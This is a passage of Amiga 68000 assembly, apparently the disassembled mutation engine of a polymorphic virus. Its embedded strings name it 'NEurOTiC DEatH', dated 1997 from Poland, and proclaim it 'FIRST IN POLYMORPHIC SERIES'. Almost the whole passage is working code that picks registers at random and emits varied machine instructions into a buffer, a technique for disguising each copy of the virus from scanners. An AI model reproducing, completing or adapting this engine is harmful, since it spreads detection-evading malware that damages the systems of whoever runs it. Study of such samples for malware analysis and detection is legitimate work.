	BNE.S	lbC0008BA
	BSR	lbC00093A
	BRA.S	lbC0008BC

lbC0008BA	BRA.S	lbC000898

lbC0008BC	LEA	lbC000B6E(PC),A4
	MOVE.B	(A0)+,D5
	AND.W	#3,D5
	MOVE.B	(A0)+,D1
	AND.W	#$1F,D1
	LSL.L	#3,D1
	BSR	lbC0009D8
	ADDQ.L	#4,SP
	MOVE.L	(SP)+,D0
	MOVE.L	D0,A0
	MOVE.L	A1,D1
	SUB.L	D0,D1
	SUBQ.W	#2,D1
	MOVE.W	D1,2(A0)
	MOVE.L	A1,D7
	SUB.L	A5,D7
	BTST	#1,D7
	BEQ.S	lbC000908
	MOVE.L	A0,-(SP)
	CLR.W	D5
	LEA	lbC000B6E(PC),A4
	MOVE.B	(A0)+,D1
	AND.W	#3,D1
	LSL.L	#3,D1
	BSR	lbC0009D8
	ADDQ.L	#2,D7
	MOVE.L	(SP)+,A0
	ADDQ.W	#2,2(A0)
lbC000908	LEA	*+$5BA(PC),A0
	MOVE.L	D7,(A0)
	MOVEM.L	(SP)+,D0-D7/A0-A6
	RTS

lbC000914	BSR.S	lbC000978
	MOVEM.L	D1/D2,-(SP)
	BSR.S	lbC000996
	MOVEM.L	(SP)+,D1/D2
	MOVE.L	#$4EB60000,D0
	ADD.B	D2,D0
	ROL.W	#4,D0
	ADD.B	D1,D0
	ROR.W	#4,D0
	MOVE.L	D0,(A1)+
	RTS

lbC000932	MOVE.L	#$4EAEFD84,(A1)+
	RTS

lbC00093A	BSR.S	lbC000978
	MOVEM.L	D1/D2,-(SP)
	BSR.S	lbC000996
	MOVEM.L	(SP)+,D1/D2
	MOVE.L	#$20760002,D0
	ADD.B	D2,D0
	ROL.W	#4,D0
	ADD.B	D1,D0
	ROR.W	#4,D0
lbC000954	MOVE.B	(A0)+,D1
	AND.W	#3,D1
	CMP.W	#6,D1
	BGE.S	lbC000954
	ROL.L	#7,D0
	ADD.B	D1,D0
	ROR.L	#7,D0
	MOVE.L	D0,(A1)+
	MOVE.L	D1,-(SP)
	BSR.S	lbC000996
	MOVE.L	(SP)+,D1
	MOVE.W	#$4E90,D0
	ADD.W	D1,D0
	MOVE.W	D0,(A1)+
	RTS

lbC000978	MOVE.L	#$303CFD84,D0
	MOVE.B	(A0)+,D2
	AND.W	#$7C,D2
	SUB.B	D2,D0
	MOVE.B	(A0)+,D1
	ROL.L	#7,D0
	AND.W	#7,D1
	ADD.B	D1,D0
	ROR.L	#7,D0
	MOVE.L	D0,(A1)+
	RTS

lbC000996	MOVE.B	(A0)+,D5
	AND.W	#7,D5
lbC00099C	LEA	ascii.MSG(PC),A4
	MOVE.B	(A0)+,D1
	EOR.B	D5,D1
	AND.W	#7,D1
	LSL.L	#3,D1
	JSR	0(A4,D1.W)
	DBRA	D5,lbC00099C

	RTS

lbC0009B4	MOVE.B	(A0)+,D5
	AND.W	#$1F,D5
	LEA	lbC000B6E(PC),A4
	LEA	ascii.MSG(PC),A6
lbC0009C2	MOVE.B	(A0)+,D1
	ADD.B	D5,D1
	CMP.B	#$3F,(A0)+
	BMI.S	lbC0009D2
	CMP.B	#$1F,(A0)+
	BHI.S	lbC0009DE
lbC0009D2	AND.W	#$1F,D1
	LSL.L	#3,D1
lbC0009D8	JSR	0(A4,D1.W)
	BRA.S	lbC0009E8

lbC0009DE	AND.W	#7,D1
	LSL.L	#3,D1
	JSR	0(A6,D1.W)
lbC0009E8	DBRA	D5,lbC0009C2

	RTS

lbC0009EE	MOVE.B	(A0)+,D1
	AND.W	#7,D1
	CMP.W	lbB000CC0(PC),D1
	BEQ.S	lbC0009EE
	CMP.W	lbB000CC2(PC),D1
	BEQ.S	lbC0009EE
	BTST	#0,(A0)+
	BNE.S	lbC000A0A
	ADD.B	#$40,D0
lbC000A0A	ADD.B	D1,D0
	CMP.W	D0,D6
	BEQ.S	lbC000A14
	MOVE.W	D0,(A1)+
	MOVE.W	D0,D6
lbC000A14	RTS

lbC000A16	MOVE.B	(A0)+,D1
	BRA	lbC000C78

	CMP.W	D0,D6
	BEQ.S	lbC000A24
	MOVE.W	D0,(A1)+
	MOVE.W	D0,D6
lbC000A24	RTS

lbC000A26	MOVE.B	(A0)+,D1
	AND.W	#7,D1
	CMP.W	lbB000CC0(PC),D1
	BEQ.S	lbC000A26
	CMP.W	lbB000CC2(PC),D1
	BEQ.S	lbC000A26
	ROL.L	#7,D0
	ADD.B	D1,D0
	ROR.L	#7,D0
	CMP.W	#$48E7,D0
	BEQ.S	lbC000A4C
	MOVE.B	(A0)+,D2
	LSL.W	#8,D2
	MOVE.B	(A0)+,D2
	MOVE.W	D2,D0
lbC000A4C	CMP.L	D0,D6
	BEQ.S	lbC000A54
	MOVE.L	D0,(A1)+
	MOVE.L	D0,D6
lbC000A54	RTS

lbC000A56	MOVE.B	(A0)+,D1
	AND.W	#$FC,D1
	MOVE.W	D1,D0
	ROL.L	#7,D0
lbC000A60	MOVE.B	(A0)+,D1
	AND.W	#7,D1
	CMP.W	#6,D1
	BGE.S	lbC000A60
	CMP.W	ascii.MSG1(PC),D1
	BEQ.S	lbC000A60
	ADD.B	D1,D0
	ROR.L	#7,D0
	CMP.L	D0,D6
	BEQ.S	lbC000A7E
	MOVE.L	D0,(A1)+
	MOVE.L	D0,D6
lbC000A7E	RTS

lbC000A80	MOVE.B	(A0)+,D1
	AND.B	#1,D1
	LSL.W	#1,D1
	MOVE.W	0(A2,D1.W),D0
lbC000A8C	MOVE.B	(A0)+,D1
	AND.W	#7,D1
	CMP.W	lbB000CC0(PC),D1
	BEQ.S	lbC000A8C
	CMP.W	lbB000CC2(PC),D1
	BEQ.S	lbC000A8C
	ADD.B	D1,D0
	BTST	#0,(A0)+
	BNE.S	lbC000AAA
	ADD.B	#$40,D0
lbC000AAA	MOVE.W	D0,(A1)+
	MOVE.B	(A0)+,(A1)+
	MOVE.B	(A0)+,(A1)+
	RTS

lbC000AB2	MOVE.B	(A0)+,D1
	AND.W	#3,D1
	LSL.B	#6,D1
	ADD.B	D1,D0
lbC000ABC	MOVE.B	(A0)+,D1
	AND.W	#7,D1
	CMP.W	lbB000CC0(PC),D1
	BEQ.S	lbC000ABC
	CMP.W	lbB000CC2(PC),D1
	BEQ.S	lbC000ABC
	ADD.B	D1,D0
	MOVE.W	D0,(A1)+
	MOVE.B	(A0)+,(A1)+
	MOVE.B	(A0)+,D0
	AND.B	#$1F,D0
	MOVE.B	D0,(A1)+
	RTS

	AND.L	#$FFFF,D0
	MOVE.B	(A0)+,D1
	AND.W	#7,D1
	ADD.B	D1,D0
	BTST	#0,(A0)+
	BNE.S	lbC000B0C
	ADD.B	#$40,D0
	BTST	#0,(A0)+
	BNE.S	lbC000B08
	ADD.B	#$40,D0
	SWAP	D0
	MOVE.L	D0,(A1)+
	CLR.W	(A1)+
	RTS

lbC000B08	SWAP	D0
	BRA.S	lbC000B14

lbC000B0C	SWAP	D0
	MOVE.B	(A0)+,D1
	LSL.W	#8,D1
	ADD.W	D1,D0
lbC000B14	CMP.L	D0,D6
	BEQ.S	lbC000B1C
	MOVE.L	D0,(A1)+
	MOVE.L	D0,D6
lbC000B1C	RTS

ascii.MSG	dc.b	'0:',0
	dc.b	'>`',0
	dc.b	$FE
	dc.b	$CA
	dc.b	'0:',0
	dc.b	'8`',0
	dc.b	$FE
	dc.b	$F0
	dc.b	'0:',0
	dc.b	'2`',0
	dc.b	$FE
	dc.b	$E2
	dc.b	'0:',0
	dc.b	',`',0
	dc.b	$FE
	dc.b	$DA
	dc.b	'0:',0
	dc.b	'&`',0
	dc.b	$FF
	dc.b	$9A
	dc.b	'0:',0
	dc.b	' `',0
	dc.b	$FF
	dc.b	$92
	dc.b	'0:',0
	dc.b	$1A
	dc.b	'`',0
	dc.b	$FF
	dc.b	$8A
	dc.b	'0:',0
	dc.b	$14
	dc.b	'`',0
	dc.b	$FF
	dc.b	$82
	dc.b	'J@Nq'
	dc.b	1
	dc.b	0
	dc.b	$B0
	dc.b	'@'
ascii.MSG0	dc.b	10
	dc.b	0
	dc.b	0
	dc.b	0
	dc.b	6
	dc.b	0
	dc.b	4
	dc.b	0

lbC000B6E	MOVE.W	#$140,D0
	BRA	lbC000A16

	MOVE.W	#$180,D0
	BRA	lbC000A16

	MOVE.W	#$8100,D0
	BRA	lbC000A16

	MOVE.W	#$4800,D0
	BRA	lbC0009EE

	MOVE.W	#$4240,D0
	BRA	lbC0009EE

	MOVE.W	#$800,D0
	BRA	lbC000AB2

	MOVE.W	#$8040,D0
	BRA	lbC000C6E

	MOVE.W	#$E060,D0
	BRA	lbC000C6E

	MOVE.W	#$E160,D0
	BRA	lbC000C6E

	MOVE.W	#$E068,D0
	BRA	lbC000C6E

	MOVE.W	#$E168,D0
	BRA	lbC000C6E

	MOVE.W	#$E078,D0
	BRA	lbC000C6E

	MOVE.W	#$E178,D0
	BRA	lbC000C6E

	MOVE.W	#$9040,D0
	BRA	lbC000C6E

	MOVE.W	#$D040,D0
	BRA	lbC000C6E

	MOVE.W	#$E070,D0
	BRA	lbC000C6E

	MOVE.W	#$E170,D0
	BRA	lbC000C6E

	MOVE.W	#$9140,D0
	BRA	lbC000C6E

	MOVE.W	#$D140,D0
	BRA	lbC000C6E

	MOVE.W	#$4440,D0
	BRA	lbC0009EE

	MOVE.W	#$4040,D0
	BRA	lbC0009EE

	MOVE.W	#$C100,D0
	BRA	lbC000A16

	MOVE.W	#$B140,D0
	BRA	lbC000C6E

	MOVE.W	#$7000,D0
	BRA	lbC000C6E

	MOVE.W	#$180,D0
	BRA	lbC000A16

	MOVE.W	#$4880,D0
	BRA	lbC0009EE

	MOVE.W	#$C140,D0
	BRA	lbC000A16

	LEA	ascii.MSG0(PC),A2
	BRA	lbC000A80

	MOVE.L	lbL000806(PC),D0
	BRA	lbC000A56

	MOVE.W	#$4640,D0
	BRA	lbC0009EE

	MOVE.L	lbL0007F2(PC),D0
	BRA	lbC000A26

	MOVE.W	#$140,D0
	BRA	lbC000A16

lbC000C6E	MOVE.B	(A0)+,D1
	TST.B	D1
	BGT.S	lbC000C78
	ADD.B	#$40,D0
lbC000C78	MOVE.B	D1,D2
	ROR.B	#4,D2
	AND.W	#7,D1
	AND.W	#7,D2
	CMP.W	lbB000CC0(PC),D1
	BNE.S	lbC000C8E
	MOVE.B	(A0)+,D1
	BRA.S	lbC000C78

lbC000C8E	CMP.W	lbB000CC2(PC),D1
	BNE.S	lbC000C98
	MOVE.B	(A0)+,D1
	BRA.S	lbC000C78

lbC000C98	CMP.W	lbB000CC0(PC),D2
	BNE.S	lbC000CA2
	MOVE.B	(A0)+,D1
	BRA.S	lbC000C78

lbC000CA2	CMP.W	lbB000CC2(PC),D2
	BNE.S	lbC000CAC
	MOVE.B	(A0)+,D1
	BRA.S	lbC000C78

lbC000CAC	OR.B	D1,D0
	ROL.W	#7,D0
	OR.B	D2,D0
	ROR.W	#7,D0
	CMP.W	D0,D6
	BEQ.S	lbC000CBC
	MOVE.W	D0,(A1)+
	MOVE.W	D0,D6
lbC000CBC	RTS

ascii.MSG1	dc.b	0
lbB000CBF	dc.b	0
lbB000CC0	dc.b	0
lbB000CC1	dc.b	0
lbB000CC2	dc.b	0
ascii.MSG2	dc.b	0
	dc.b	'*[muTAgeN2]*'
ascii.MSG3	dc.b	0
lbB000CD1	dc.b	0
ascii.MSG4	dc.b	0
	dc.b	$A0
	dc.b	13
	dc.b	'---=[ NEurOTiC DEatH ]=---  (c) 1997 Poland',0,0
	dc.b	'Grt''s to *Markus*,  m/\|) r0GEr',0
	dc.b	'!! FIRST IN POLYMORPHIC SERIES !!',0
doslibrary.MSG	dc.b	'dos.library',0
lbL000D50	dc.l	0
	END
